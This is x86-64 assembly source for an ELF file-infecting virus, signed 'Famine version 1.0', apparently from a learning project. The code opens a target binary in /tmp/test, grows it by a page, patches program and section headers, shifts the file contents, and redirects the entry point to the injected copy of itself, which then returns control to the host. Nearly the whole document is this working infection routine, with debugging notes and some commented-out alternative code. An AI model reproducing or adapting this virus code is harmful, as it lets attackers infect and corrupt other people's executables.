
; 791 bytes

%include "strife.inc"

bits 64
section .text
default rel
global _start

_start:
	push rdi
	push rsi
	push rcx
	push rdx

	; === Placing our 'famine' struct on the stack ===
	push rbp
	mov rbp, rsp
	sub rsp, famine_size

	call _file

	add rsp, famine_size
	lea r15, [rel _start]
	mov rsi, [rel virus_entry]
	sub r15, rsi
	add r15, [rel host_entry]

	pop rbp
	pop rdx
	pop rcx
	pop rsi
	pop rdi
	jmp r15




; ##### FILE INFECTION #####

_file:
	; === open(filename, O_RDWR, 0) | (path must be in rdi) ===
	lea rdi, [rel target_file]
	mov rax, SYS_OPEN
	mov rsi, O_RDWR
	xor rdx, rdx
	syscall
	mov r8, rax													; r8 will have fd (for mmap)
	cmp rax, 0													; Error checking (open failed)
	jl _return

	; === Calculate the size of the file with lseek ===
	mov rdi, rax
	xor rsi, rsi
	mov rdx, 2
	mov rax, SYS_LSEEK
	syscall
	cmp rax, 4													; Error checking (file too small)
	jl _return
	mov FAM(famine.fsize), rax

	; === mmap(0, filesize, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0) ===
	xor rdi, rdi
	mov rsi, rax
	mov rdx, PROT_READ | PROT_WRITE
	mov r10, MAP_PRIVATE
	xor r9, r9
	mov rax, 9
	syscall
	mov FAM(famine.map_ptr), rax								; Saving mapped file pointer in famine.map_ptr
	cmp rax, 0													; Error checking (mmap failed)
	jl _return

	; === Making sure the file is an ELF file ===
	cmp dword [rax], 0x464c457f									; Magic bytes characterising an ELF file
	jne _return

	; === Making sure the ELF file is x64 ===
	cmp byte [rax + 0x4], 0x2
	jne _return

	; === Close the mapping with munmap ===
	mov rdi, rax
	mov rsi, FAM(famine.fsize)
	mov rax, SYS_MUNMAP
	syscall

	; === Truncate the file to add 4096 bytes (syscall ftruncate) ===
	mov rdi, r8
	mov rsi, FAM(famine.fsize)
	add rsi, PAGE_SIZE
	mov rax, SYS_FTRUNCATE
	syscall

	; === Generate a new mapping MAP_SHARED of the extended file to modify it ===
	xor rdi, rdi
	mov rsi, FAM(famine.fsize)
	add rsi, PAGE_SIZE
	mov rdx, PROT_READ | PROT_WRITE
	mov r10, MAP_SHARED
	xor r9, r9
	mov rax, SYS_MMAP
	syscall
	mov FAM(famine.map_ptr), rax
	cmp rax, 0
	jl _return


	; === Getting the segments offset in file ===
	mov rax, FAM(famine.map_ptr)
	add rax, elf64_ehdr.e_phoff

	; === Finding the text segment in file ===
	mov r11, [rax]												; Storing e_phoff in r11
	mov rax, FAM(famine.map_ptr)
	mov r14, rax
	add r14, elf64_ehdr.e_phnum
	movzx r14, word [r14]										; Storing e_phnum in r14

	dec r14														; Decrementing by 1 since our counter starts at 0
	add rax, r11												; rax is now at the start of segment headers in file
	xor r13, r13												; Used to loop through all segment headers
	_phnum_loop:
		call _is_text_segment
		cmp r14, r13
		je _exit											; We iterated through all segment headers and didnt find the text segment. Give up for this file
		add rax, elf64_phdr_size
		inc r13
		jmp _phnum_loop
	_found_text_segment:									; r13 has index of current segment and r14 has e_phnum
		push rax
		add rax, elf64_phdr.p_offset
		mov rdi, [rax]
		mov FAM(famine.txt_offset), rdi
		add rax, elf64_phdr.p_vaddr - elf64_phdr.p_offset
		mov rdi, [rax]
		mov FAM(famine.txt_vaddr), rdi
		add rax, elf64_phdr.p_filesz - elf64_phdr.p_vaddr
		mov rdi, [rax]
		mov FAM(famine.txt_filesz), rdi
		add rax, elf64_phdr_size - (elf64_phdr.p_filesz - elf64_phdr.p_offset)
		mov rdi, [rax]
		mov FAM(famine.next_offset), rdi
		
		mov rsi, FAM(famine.next_offset)
		mov rdi, FAM(famine.txt_offset)
		add rdi, FAM(famine.txt_filesz)
		sub rsi, rdi
		mov FAM(famine.gap_size), rsi							; OK

		pop rax
		push rax
		
		; OK
		add rax, elf64_phdr.p_filesz							; p_filesz += VIRUS_SIZE
		mov rdi, [rax]
		add rdi, VIRUS_SIZE
		mov [rax], rdi

		; OK
		add rax, elf64_phdr.p_memsz - elf64_phdr.p_filesz		; p_memsz += VIRUS_SIZE
		mov rdi, [rax]
		add rdi, VIRUS_SIZE
		mov [rax], rdi

		pop rax
	
	_patch_segments:
		add rax, elf64_phdr_size
		mov rdi, rax
		add rdi, elf64_phdr.p_offset							; p_offset += PAGE_SIZE
		mov rsi, [rdi]
		add rsi, PAGE_SIZE
		mov [rdi], rsi

		inc r13
		cmp r13, r14
		jne _patch_segments
	

	; === Finding sections ===
	mov rax, FAM(famine.map_ptr)
	
	mov r11, rax
	add r11, elf64_ehdr.e_shoff
	mov r11, [r11]							; Storing e_shoff in r11 [OK]

	mov r14, rax
	add r14, elf64_ehdr.e_shnum
	movzx r14, word [r14]					; Storing e_shnum in r14 [OK]

	mov r13, FAM(famine.txt_offset)			; Storing injection_point in r13
	add r13, FAM(famine.txt_filesz)

	xor r12, r12							; r12 will be our counter

	add rax, r11							; We're at the start of section headers in the mapping [OK]

	_patch_sections:
	mov rdi, rax
	add rdi, elf64_shdr.sh_offset
	mov rsi, [rdi]
	cmp r13, rsi
	jge .pass
	add qword [rdi], PAGE_SIZE
	.pass:
	inc r12
	cmp r12, r14
	je _patch_elf_header
	add rax, elf64_shdr_size
	jmp _patch_sections


	_patch_elf_header:
	mov rax, FAM(famine.map_ptr)		; [sections OK]
	add rax, elf64_ehdr.e_shoff
	mov rdi, [rax]
	cmp r13, rdi
	jge _write
	add qword [rax], PAGE_SIZE


	_write:								; Check integrity of sections (section 19 [x /x (0x7ffff7ff4000 + 6432 + 48 + (0x40 * 19))] ) before copying
	mov rsi, FAM(famine.map_ptr)		; and after copying. Something seems to modify section headers (before moving the bytes ? During ?)
	add rsi, FAM(famine.fsize)

	mov rdi, rsi
	add rdi, PAGE_SIZE

	mov rcx, FAM(famine.map_ptr)
	add rcx, FAM(famine.fsize)

	mov rax, FAM(famine.map_ptr)
	add rax, FAM(famine.txt_offset)
	add rax, FAM(famine.txt_filesz)
	add rax, FAM(famine.gap_size)

	sub rcx, rax						; rcx has length to move
	inc rcx
	std
	rep movsb							; shift by 4096 bytes

	; === Patch ELF entry point ===
	mov rax, FAM(famine.map_ptr)
	add rax, elf64_ehdr.e_entry
	mov rsi, [rax]
	mov FAM(famine.orig_entry), rsi
	mov rdi, FAM(famine.txt_vaddr)
	add rdi, FAM(famine.txt_filesz)
	mov r13, rdi
	mov [rax], rdi


	; === Writing virus ===
	mov rdi, FAM(famine.map_ptr)
	add rdi, FAM(famine.txt_offset)
	add rdi, FAM(famine.txt_filesz)
	lea rsi, [rel _start]
	mov rcx, VIRUS_SIZE
	cld
	repnz movsb

	mov qword [rdi - 8], r13
	mov r14, FAM(famine.orig_entry)
	mov qword [rdi - 16], r14

	; Calculating necessary padding		r13 still has injection_point offset
	;									r12 has gap_size
	;									r11 has VIRUS_SIZE
	mov r13, FAM(famine.txt_offset)
	add r13, FAM(famine.txt_filesz)
	
	mov r12, FAM(famine.gap_size)		
	mov r11, VIRUS_SIZE

	mov r10, r13						; r10 --> upper limit
	add r10, r12
	add r10, PAGE_SIZE

	sub r11, r12						; ATTENTION ici si VIRUS_SIZE est inférieur à gap_size !

	mov r9, r13
	add r9, r12
	add r9, r11							; r9 --> injection_point + gap_size + (VIRUS_SIZE - gap_size)
	sub r10, r9

	lea rsi, FAM(famine.padding)		; Writing padding
	mov rdi, FAM(famine.map_ptr)
	add rdi, r9


	mov rcx, r10
	rep movsb







;	_write:
	; === Open outfile ===
;	lea rdi, [rel out_file]
;	mov rsi, O_WRONLY | O_CREAT | O_APPEND
;	mov rdx, 0x1FF
;	mov rax, SYS_OPEN
;	syscall

;	mov rdi, rax						; Writing until injection point
;	mov rsi, FAM(famine.map_ptr)
;	mov rdx, r13
;	mov rax, SYS_WRITE
;	syscall

;	lea rsi, [rel _start]				; Writing the virus at injection point
;	mov rdx, VIRUS_SIZE
;	mov rax, SYS_WRITE
;	syscall

	; Calculating necessary padding		r13 still has injection_point offset
	;									r12 has gap_size
	;									r11 has VIRUS_SIZE
;	mov r12, FAM(famine.gap_size)		
;	mov r11, VIRUS_SIZE

;	mov r10, r13						; r10 --> upper limit
;	add r10, r12
;	add r10, PAGE_SIZE

;	sub r11, r12						; ATTENTION ici si VIRUS_SIZE est inférieur à gap_size !

;	mov r9, r13
;	add r9, r12
;	add r9, r11							; r9 --> injection_point + gap_size + (VIRUS_SIZE - gap_size)
;	sub r10, r9

;	lea rsi, FAM(famine.padding)		; Writing padding
;	mov rdx, r10
;	mov rax, SYS_WRITE
;	syscall

;	mov rsi, FAM(famine.map_ptr)		; Writing rest of parent file
;	add rsi, FAM(famine.txt_offset)
;	add rsi, FAM(famine.txt_filesz)
;	add rsi, FAM(famine.gap_size)
;	mov rdx, FAM(famine.fsize)
;	sub rdx, FAM(famine.txt_offset)
;	sub rdx, FAM(famine.txt_filesz)
;	sub rdx, FAM(famine.gap_size)
;	mov rax, SYS_WRITE
;	syscall



	jmp _return


_is_text_segment:
	mov rsi, rax												; rax has the address of p_type
	cmp dword [rsi], 0x1										; |
	jne _return													; |	--> If the segment type isn't PT_LOAD, this isn't the text segment  
	add rsi, elf64_phdr.p_flags
	mov rsi, [rsi]
	and rsi, 0x1												; |
	cmp rsi, 0x0												; | --> If the segment hasn't the flag PF_X (executable), this isn't the text segment
	je _return													; |
	pop rdi
	jmp _found_text_segment

_return:
	ret

_exit:
	mov rax, SYS_EXIT
	mov rdi, 0
	syscall

target_1	db		"/tmp/test/",0x0
target_2	db		"/tmp/test2/",0x0
target_file	db		"/tmp/test/sample",0x0
out_file	db		"strife.out",0x0
signature	db		"Famine version 1.0 (c)oded by qroland",0x0
fill		db		"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
host_entry	dq		_exit
virus_entry	dq		_start
_finish:

